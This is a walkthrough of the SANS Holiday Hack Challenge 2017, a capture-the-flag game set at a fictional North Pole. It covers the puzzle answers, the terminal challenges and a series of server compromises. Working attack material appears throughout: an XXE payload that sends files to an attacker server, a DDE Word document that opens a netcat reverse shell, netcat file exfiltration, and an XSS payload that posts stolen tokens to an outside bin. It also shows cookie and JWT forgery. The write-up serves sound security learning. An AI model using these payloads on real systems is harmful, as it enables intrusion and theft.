# Holiday Hack Challenge 2017!

This is my writeup for the holiday hack
challenge 2017... Let's go!

## Question's

1. Visit the North Pole and Beyond at the 
Winter Wonder Landing Level to collect the 
first page of The Great Book using a giant snowball.
What is the title of that page?

	Answer: About this book...

	SHA1: 6dda7650725302f59ea42047206bd4ee5f928d19

2. Investigate the Letters to Santa application at
https://l2s.northpolechristmastown.com. What is the
topic of The Great Book page available in the web root of the
server? What is Alabaster Snowball's password?

	Answer: The topic of the GreatBookPage2.pdf is about flying animals
	like the flying monkeys of Oz and the flying reindeer of Santa
	The password for Alabaster is stream_unhappy_buy_loss

	SHA1: aa814d1c25455480942cb4106e6cde84be86fb30

3. The North Pole engineering team uses a Windows SMB server for
sharing documentation and correspondence. Using your access to
the Letters to Santa server, identify and enumerate the SMB
file-sharing server. What is the file server share name? 

	Answer: Name of the share is FileStor

	SHA1: 57737da397cbfda84e88b573cd96d45fcf34a5da

4. Elf Web Access (EWA) is the preferred mailer for North Pole elves,
available internally at http://mail.northpolechristmastown.com.
What can you learn from The Great Book page found in an e-mail on that server?

	Answer: That the Munchkins established an Elite Fighting Force called
	the Lollipop Guild to defend Oz against Elven aggression

	SHA1: f192a884f68af24ae55d9d9ad4adf8d3a3995258

5. How many infractions are required to be marked as
naughty on Santa's Naughty and Nice List? What are the
names of at least six insider threat moles? Who is throwing
the snowballs from the top of the North Pole Mountain and what is your proof? 

	Answer: You need 3 to 4 infractions, I found the Abominable
	snow monster in the snowball game which was throwing the
	snowballs.

6. The North Pole engineering team has introduced an Elf as a Service
(EaaS) platform to optimize resource allocation for mission-critical
Christmas engineering projects at http://eaas.northpolechristmastown.com.
Visit the system and retrieve instructions for accessing
The Great Book page from C:\greatbook.txt.
Then retrieve The Great Book PDF file by following those directions.
What is the title of The Great Book page?

	Answer: The dreaded inter-dimensional tornadoes

	SHA1: 8943e0524e1bf0ea8c7968e85b2444323cb237af

7. Like any other complex SCADA systems, the North Pole uses Elf-Machine Interfaces
(EMI) to monitor and control critical infrastructure assets.
These systems serve many uses, including email access and web browsing.
Gain access to the EMI server through the use of a phishing attack
with your access to the EWA server.
Retrieve The Great Book page from C:\GreatBookPage7.pdf.
What does The Great Book page describe?

	Answer: It describes the behaviour of the great witches of Oz

	SHA1: c1df4dbc96a58b48a9f235a1ca89352f865af8b8

## Sn0wBallz

Well, what is there to say. I actually began
to like the snowball game but have to admit
it had me frustrated in the beginning, which is why
I did as much CranPi terminals before doing the game.

The more terminals you crack, the more usables you get
for deflecting the snowball to the end. really fun actually.

Yes, I did all the snowball quests.

## Terminals

### Winter Wonder Landing
To be honoust it took me a while before I 
figured out the mechanics of the snowball game.
So first I went with all terminals. first terminal
I took down was the one in the Winter Wonder Landing
level. 
The find command from the $PATH was the wrong one,
so just running "whereis find" shows us to run find
from /usr/bin/find and not /usr/local/bin/find.
```shell
$ /usr/bin/find / -name elftalkd 2> /dev/null
/run/elftalk/bin/elftalkd <-- hello there! ;-P
```

### Winconceivable: The cliffs of Winsanity
We have to kill the 'santaslittlehelperd' process.

Reading up on the twitter of Sparkle Redberry
led me to believe that this had something to do with
aliases. Let's check the shell's .bashrc file.
```shell
$ grep -i 'alias' .bashrc
alias kill='true'
alias killall='true'
alias pkill='true'
...
```

So yes, when we run kill we are actually running true,
which is not capable of killing processes... let's kill
the requested proces
```shell
$ /bin/kill -9 $(pidof santaslittlehelperd)
```

### There's snow place like home
We need to run the trainstartup binary.
```shell
$ file trainstartup
trainstartup: ELF 32-bit LSB  executable, ARM, EABI5 ...<snip>...
```
Okay, it is an ARM 32 bit executable, but we are on x64.
```shell
$ uname -p
x86_64
```

tab completion showed me that there is a full install of qemu.
Running 'qemu-arm trainstartup' gives us a nice ASCIImation and
completes the challenge.

### Cryokinetic Magic
I really liked this challenge, 
learned a very neat trick, thanks guys!

We have to run an executable in our home folder,
owned by root and no execute bit is set. Should be
simple enough, I copied the program and used chmod to set the
execute bit. It didn't work, another utility that has been
tampered with... 

Being clueless I went to the Twitter page of
the elf to look for hints and read some really cool blogpost
about using the LD_PRELOAD environment variable to trick a binary
in using your self defined functions. This didn't work here because 
we can't trace which functions the binary calls.

A post on superuser linked to by the twitter gave another great
technique; using ld-linux as an ELF interpreter. let's find this file.
```shell
$ find / -name "ld-linux*" 2>/dev/null
/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
/lib64/ld-linux-x86-64.so.2

$ ls -l /lib64/ld-linux-x86-64.so.2
lrwxrwxrwx 1 root root 32 Jun 16 20:57 /lib64/ld-linux-x86-64.so.2 -> /lib/x86_64-linux-gnu/ld-2.23.so
```
Let's use that to run the executable
```shell
$ /lib/x86_64-linux-gnu/ld-2.23.so $(pwd)/CandyCaneStriper
```

Nice ASCII art and done ;-D.

### Bumbles bounce
We have to find the least-popular browser by
checking an access log in the homefolder.

We can use awk to take a specific field (delimited
by spaces) and put that into sort and uniq to find the
browser given in the user agent that accessed the server.

Counting the fields shows that the 12th field contains
the name of the browser, so we will use awk to only print
this field, sort the output and use uniq with the -c switch
to prepend the count to the unique lines in the output.
```shell
$ awk '{print $12}' < access.log | sort | uniq -c
    47 
      2 "(KHTML,
     90 "-"
      1 "Dillo/3.0.5"
      3 "GarlikCrawler/1.2
     34 "Googlebot-Image/1.0"
      3 "MobileSafari/604.1
    357 "Mozilla/4.0
  97534 "Mozilla/5.0
.....
```

Hmmm... the most used one is Mozilla/5.0, some of the least used
user agents aren't even webbrowsers but crawlers like Googlebot,
Twitterbot etc. But what is Dillo? Well, Dillo is the least popular
webbrowser it seems.

Maybe this is not the intended way, but it worked for me.

### I don't think we're in Kansas anymore
So for this terminal we have to determine the most liked song
inside of a sqlite database.

checking the schema gives us the following:
```shell
sqlite> .schema
CREATE TABLE songs(
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  title TEXT,
  artist TEXT,
  year TEXT,
  notes TEXT
);
CREATE TABLE likes(
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  like INTEGER,
  datetime INTEGER,
  songid INTEGER,
  FOREIGN KEY(songid) REFERENCES songs(id)
);
```
likes.like is an integer that is set to 0 or 1
to determine wheter or not a specific song has a like

lets find the song with the most likes with by looking for
the songid with the most entries and the likes.like set to 1

```shell
sqlite> SELECT title, like, songid, COUNT(*) totalcount FROM songs, likes WHERE like = 1 AND songs.id = likes.songid GROUP BY title HAVING COUNT(*) > 1 ORDER BY COUNT(*) ASC;
```

This will throw out a list of songs with the most popular
one at the bottom just above our sqlite> prompt.
The most popular song seems to be stairway to heaven!

### Oh wait! Maybe we are...
We have to restore the contents of the /etc/shadow
file with the contents of /etc/shadow.bak and are given
the hint to check which commands we can run with sudo

```shell
$ sudo -l
...<snip>...
User elf may run the following commands on 44fcbb65bef9:
    (elf : shadow) NOPASSWD: /usr/bin/find
```

So we can run find with the rights of the shadow group, which
also has write access to the /etc/shadow file, making this challenge
fairly easy. We can use the -exec flag of the find command to execute
any bash command that we like.

```shell
$ sudo -g shadow find / -name 'shadow' -exec bash -c 'cat {}.bak > {}' \; 2>/dev/null
```

If we now run the inspect_da_box command it will tell us
that we have succeeded with some ASCII art.

### We're off to see the...
For this challenge we have a binary that uses the rand() libc
function to generate a pseudo-random number and then checks if
that number was 42. We have to force it to return 42 somehow.

I used the dynamic linker technique to substitute the rand() function
with one of my own which just returns the number 42.

```c
int rand(){
	return 42;
}
```

Now all we have to do is make a shared object of this source and load
it with the binary.

```shell
$ gcc -shared -fPIC myrand.c -o myrand.so
$ LD_PRELOAD=$(pwd)/myrand.so ./isit42 
```
This makes the binary use our rand() function and it returns
the number 42, and so we conclude the terminal challanges :-D

## l2s server

In the HTML source of https://l2s.northpolechristmastown.com we can
see a development page called dev.northpolechristmastown.com. going there
and using the hint from sparkle redberry we can see that we have to exploit
the orders.xhtml page. I used the tailored exploit from https://github.com/chrisjd20/cve-2017-9805.py
to place a php shell on the webroot. 

When connecting to my webshell I had a really hard time finding Alabasters password.
reading /etc/passwd gave me his username however: "alabaster_snowball".

After searching for longer than I want to admit I found out that
maybe he stored his password somewere in a development file from a tip
of one of the elves so I started to search in /opt/. 
Using `find /opt/ -user alabaster_snowball -exec cat {} \;` I found a
lot of files belonging to alabaster, but nothing containing a password.

Lets grep the files
```shell
$ cd /opt/ && grep -Hir 'alabaster_snowball'
/opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class:            final String username = "alabaster_snowball";
```
Okay, but i somehow cannot open the whole file, what about
setting some context to our grep output?
```shell
$ cd /opt/ && grep -Hir -C 3 'alabaster_snowball'
/opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class-    public class Connect {
/opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class-            final String host = "localhost";
/opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class:            final String username = "alabaster_snowball";
/opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class-            final String password = "stream_unhappy_buy_loss";   
```

YAY! we got the password

## SMB through l2s server

For the next challenge we have to forward a local port to one
on the internal network through the SSH server.

First I ran an NMap scan in the internal 10.142.0.0/24 network
without ping to scan services within the network to find a host
with SMB on 10.142.0.7. Now we can use port forwarding through
SSH to connect to this fileshare.
```shell
$ ssh -L 4455:10.142.0.7:445 alabaster_snowball@35.185.84.51
```

Then I used my Mac to connect to the fileshare on smb://127.0.0.1:4455
and logged in with alabaster's account to mount the FileStor share.
There I found the third of the bookpages.


## EaaS (Elf as a Service)

At this point I lost a lot of time trying to figure out
the mailserver because it is down a lot, so I thought it was better
to go on with another system.

Forwarding port 80 on the eaas server through SSH gives us a webpage
where you can order elves, you can do this by submitting an
XML form to the website. Completing the terminals gives us some
hints on the servers and it seems that this server is vulnerable to an
XXE (XML External Entity) attack.  

We can set entities in the XML-header
of the file that we upload to manipulate the server
to give us what we want. There should be instructions to grab the
bookpage pdf in C:\greatbook.txt so we want that file.

Our uploaded XML contains a reference to a DTD file that we
can serve on the internet-facing SSH server

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY % stolendata SYSTEM "file:///c:/greatbook.txt">
<!ENTITY % inception "<!ENTITY &#x25; sendit SYSTEM 'http://10.142.0.11:7343/?%stolendata;'>">
```

this should return the contents of greatbook.txt to the webserver
hosting this file, now let's upload the following XML file to
the eaas server:

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE demo [
    <!ELEMENT demo ANY >
    <!ENTITY % extentity SYSTEM "http://10.142.0.11:7343/evil.dtd">
    %extentity;
    %inception;
    %sendit;
    ]
<
```

Now let's serve the DTD and wait for a response:

```shell
$ python -m SimpleHTTPServer 7343
Serving HTTP on 0.0.0.0 port 7343 ...
10.142.0.13 - - [18/Dec/2017 22:01:33] "GET /evil.dtd HTTP/1.1" 200 -
10.142.0.13 - - [18/Dec/2017 22:01:33] "GET /?http://eaas.northpolechristmastown.com/xMk7H1NypzAqYoKw/greatbook6.pdf HTTP/1.1" 200 -
```

And so I grabbed the PDF from http://eaas.northpolechristmastown.com/xMk7H1NypzAqYoKw/greatbook6.pdf !

## The EWA Server

So first of all, I did this server when the issues with it were resolved
which really made it a great experience. Also I learned from a really dumb
mistake I made with this challenge.

Running NMap in the internal network shows that there is a 'cookie.txt' file
on the webroot of the HTTP server on this box. This file basically describes
the NodeJS code running on the server which sets and authenticates the user cookie.

```
//FOUND THESE FOR creating and validating cookies. Going to use this in node js
    function cookie_maker(username, callback){
        var key = 'need to put any length key in here';
        //randomly generates a string of 5 characters
        var plaintext = rando_string(5)
        //makes the string into cipher text .... in base64. When decoded this 21 bytes in total length. 16 bytes for IV and 5 byte of random characters
        //Removes equals from output so as not to mess up cookie. decrypt function can account for this without erroring out.
        var ciphertext = aes256.encrypt(key, plaintext).replace(/\=/g,'');
        //Setting the values of the cookie.
        var acookie = ['IOTECHWEBMAIL',JSON.stringify({"name":username, "plaintext":plaintext,  "ciphertext":ciphertext}), { maxAge: 86400000, httpOnly: true, encode: String }]
        return callback(acookie);
    };
    function cookie_checker(req, callback){
        try{
            var key = 'need to put any length key in here';
            //Retrieving the cookie from the request headers and parsing it as JSON
            var thecookie = JSON.parse(req.cookies.IOTECHWEBMAIL);
            //Retrieving the cipher text 
            var ciphertext = thecookie.ciphertext;
            //Retrievingin the username
            var username = thecookie.name
            //retrieving the plaintext
            var plaintext = aes256.decrypt(key, ciphertext);
            //If the plaintext and ciphertext are the same, then it means the data was encrypted with the same key
            if (plaintext === thecookie.plaintext) {
                return callback(true, username);
            } else {
                return callback(false, '');
            }
        } catch (e) {
            console.log(e);
            return callback(false, '');
        }
    };

```

We can see that it takes a random string of 5 bytes and
our 16 byte IV and makes it into a 21 byte ciphertext.

But when it decrypts our ciphertext, it does not check for this length.
which means if we encrypt a 16 byte long string with AES and supply
that into our cookie and don't set the plaintext, that our if statement in
cookie_checker() should return true.. and then we win.

I used a cookie manager addon in firefox to do this and this was my cookie:
```
{"name"="alabaster.snowball", "plaintext"="", "ciphertext"="y32O5GX+gM+wactVoI5kaA=="}
```

The ciphertext is the base64 of the AES256 encrypted string "hello, world!!!" which
is 16 bytes.

It didn't work, and I lost a whole lot of hours just staring at the node code.

I was just so sure that 'alabaster.snowball' would be the requested username because
I already deduced that from finicking with the EDB server, so after trying
about everything in the plaintext and ciphertext fields in the JSON I just
tried to set the name field to his email... which is what I should have
done from the beginning and it worked... I'm now logged in as Alabaster.


Reading Alabaster's email shows that there is a PDF at this location:
http://mail.northpolechristmastown.com:8080/attachments/GreatBookPage4_893jt91md2.pdf

## North Pole Police Department

On the NPPD server we can request infractions made by kids,
if they make too much infractions they end up being marked as
naughty on Santa's Naughty and Nice List.

We have to find out how many infractions are needed to be marked as naughty.

Through my access to the SMB server I got the Naughty and nice list as a csv file.
We can also query the NPPD website (https://nppd.northpolechristmastown.com) for
JSON files containing lists of infractions. I downloaded the JSON where the
search query was `title=*` to grab all data from the database

I wrote a python script to search for all people marked as Naughty or Nice in the
csv file and then checked for them in the JSON:

```python
import csv
import json
import sys

naughty = 0;
nice = 0;
just_the_naughty = []
just_the_nice = []

# Parsing naughty and nice list as csv
# saving all the naugties in memory
naughty_file = open("Naughty and Nice List.csv", 'r')
naughty_csv = csv.reader(naughty_file)

for line in naughty_csv:
	if line[1] == "Naughty":
		just_the_naughty.append(line[0])
	else:
		just_the_nice.append(line[0])

# Parsing JSON file
json_file = open("infractions.json", 'r')
json_data = json.load(json_file)
json_file.close()

output = csv.writer(sys.stdout)
output.writerow(["NoN", "name", "coal", "infraction"])

for person in json_data["infractions"]:
	if person["name"] in just_the_naughty:
		output.writerow(("Naughty", person["name"], len(person["coals"]) ,person["title"]))
	elif person["name"] in just_the_nice:
		output.writerow(("Nice", person["name"], len(person["coals"]), person["title"]))
```

This will output all names which are in both files and
shows if they are marked as naughty or nice. So basically
we merged the csv file and the JSON data together.

I think piping the output through `sort -r` (reverse sort) for reading
the names all together and then redirecting this to another csv file
is the best way to analyze this data.

## Phishing and data exfiltration

We have to get the Great Book Page PDF file from Alabaster Snowball's
PC called an EMI (Elf Machine Interface), it seems to be just a Windows
host as we are told the bookpage is in C:\GreatBookPage7.pdf

I forged a cookie to log in as Minty Candycane on the webmail server
so I could read and send emails. One of the emails hints at a technique
to execute code on a windows host via a Office document, wihtout the need
for a VBA macro.

If we press Ctrl-F9 inside word, we get a bracketed space in which
we can type a command to execute on the host who opens it. This will
be our attack-vector for this challenge. I tried running a staged powershell
payload that would connect back to me but that didn't seem to work. I've
found out that it should but I just couldn't manage to get it to work.

Reading the emails from Alabaster I found out he has a Windows version
of netcat on his PC, we can use netcat with the -e switch to run
cmd when it connects back to us. 
So we have to inject `nc.exe <my ip> 31337 -e cmd.exe` into word
using the DDE technique as described by one of the elves in the emails.

```shell
{ DDEAUTO c:\\Windows\\System32\\cmd.exe "/k nc.exe <my ip> 31337 -e cmd.exe" }
```

This will run the command in quotes whenever the document containing it is opened.

I put the DDEAUTO command in a word file, named it "gingerbread_cookie_recipe.docx"
and send alabaster a mail with the docx as an attachment. Now lets just open a port
in our router (I do not have access to a VPS at this moment) and listen with
netcat: 

```shell
$ nc -l 31337

C:\>

```

Alright, there is the bookpage, let's send it to us.
I also used netcat for this:

```shell
C:\> type GreatBookPage7.pdf | nc -w 3 <my ip> 31338
```

And have another listener ready to grab the file:

```shell
$ nc -l 31338 > GreatBookPage7.pdf
```

Wait a few seconds and the file is there :D.

## North Pole Elf Database

For this last server we have to perform multiple attacks.
First we need to grab a JWT token from Alabaster through
an XSS attack on the 'support' form, then we need to regenerate
a valid token to get in the system and then we need to do an LDAP
injection to finally grab Alabaster's password and grab the letter
to Santaclaus.

### XSS attack
For the XSS attack I used [RequestBin](https://requestb.in), a really
great service to debug HTTP requests, which helps me to fetch the JWT
token from Alabaster without having to set up my own server.

In the 'Message' field of the supportform we can see that it is
vulnerable to XSS by inputting some text in bold tags. I used
Owasp XSS filter evasion cheat sheet and used a variety of techniques
to test for a valid XSS evasion. It seemed that using a 
`<IMG SRC=/ onerror=<javascript here>` seemed to get through the filter.

Now let's spin up a request bin and inject some JS into our victims
webbrowser:

```javascript
<IMG SRC=/ onerror=for(var i = 0; i < localStorage.length; i++){ key=localStorage.key(i); $.post ('https://requestb.in/190f0mk1', key+': '+localStorage.getItem(key)); }>
```

This will use a for loop to iterate over the browser's localStorage and
use a POST request to send us all key-value pairs.

After a few seconds I got this in my bin:
```text
np-auth: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXB0IjoiRW5naW5lZXJpbmciLCJvdSI6ImVsZiIsImV4cGlyZXMiOiIyMDE3LTA4LTE2IDEyOjAwOjQ3LjI0ODA5MyswMDowMCIsInVpZCI6ImFsYWJhc3Rlci5zbm93YmFsbCJ9.M7Z4I3CtrWt4SGwfg7mi6V9_4raZE5ehVkI9h04kr6I
```

This token is invalid however so we need to fix that.

### Regenerating the JWT token
Why doesn't this token work when we place it in our
browser's localStorage? To find out let's use the
[PyJWT module](https://github.com/jpadilla/pyjwt) to
decode it:

```shell
$ python3
Python 3.4.2 (v3.4.2:ab2c023a9432, Oct  5 2014, 20:42:22) 
[GCC 4.2.1 (Apple Inc. build 5666) (dot 3)] on darwin

>>> import jwt
>>> jwt_encoded = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXB0IjoiRW5naW5lZXJpbmciLCJvdSI6ImVsZiIsImV4cGlyZXMiOiIyMDE3LTA4LTE2IDEyOjAwOjQ3LjI0ODA5MyswMDowMCIsInVpZCI6ImFsYWJhc3Rlci5zbm93YmFsbCJ9.M7Z4I3CtrWt4SGwfg7mi6V9_4raZE5ehVkI9h04kr6I'
>>> jwt.decode(jwt_encoded, verify=False)
{'dept': 'Engineering', 'expires': '2017-08-16 12:00:47.248093+00:00', 'uid': 'alabaster.snowball', 'ou': 'elf'}
```

This yields usefull information about the token, and as we can see
the expiry date is too old, just to test out, would it work if
we changed the date and sign it with our own key?

```shell
>>> key = 'somerandomkey'
>>> jwt_encoded = jwt.encode({'dept': 'Engineering', 'expires': '2018-08-16 12:00:47.248093+00:00', 'uid': 'alabaster.snowball', 'ou': 'elf'}, key, algorithm='HS256')
>>>
>>> print(jwt_encoded)
b'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXB0IjoiRW5naW5lZXJpbmciLCJleHBpcmVzIjoiMjAxOC0wOC0xNiAxMjowMDo0Ny4yNDgwOTMrMDA6MDAiLCJ1aWQiOiJhbGFiYXN0ZXIuc25vd2JhbGwiLCJvdSI6ImVsZiJ9.UiF_Bb8dun_m3LOZNm_rApmpiXJeP0vPDMBUvzySDQY'
```

Load this in our localStorage and hope the authentication is this broken...

```javascript
localStorage.setItem('np-auth', 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXB0IjoiRW5naW5lZXJpbmciLCJleHBpcmVzIjoiMjAxOC0wOC0xNiAxMjowMDo0Ny4yNDgwOTMrMDA6MDAiLCJ1aWQiOiJhbGFiYXN0ZXIuc25vd2JhbGwiLCJvdSI6ImVsZiJ9.UiF_Bb8dun_m3LOZNm_rApmpiXJeP0vPDMBUvzySDQY')
```

And it doesn't log us in, not surprising. So we do need to sign it with
the right key.

All dictionaries I used were not able to find the key, maybe
I was just overthinking this and as a last shot for the night I
set up this [JWT cracker](https://github.com/brendan-rius/c-jwt-cracker).
Compile and run it and in about six minutes it spits out the key: `3lv3s`

Forging a token with this key and placing it in our localStorage
let's us log in as Alabaster on the database!
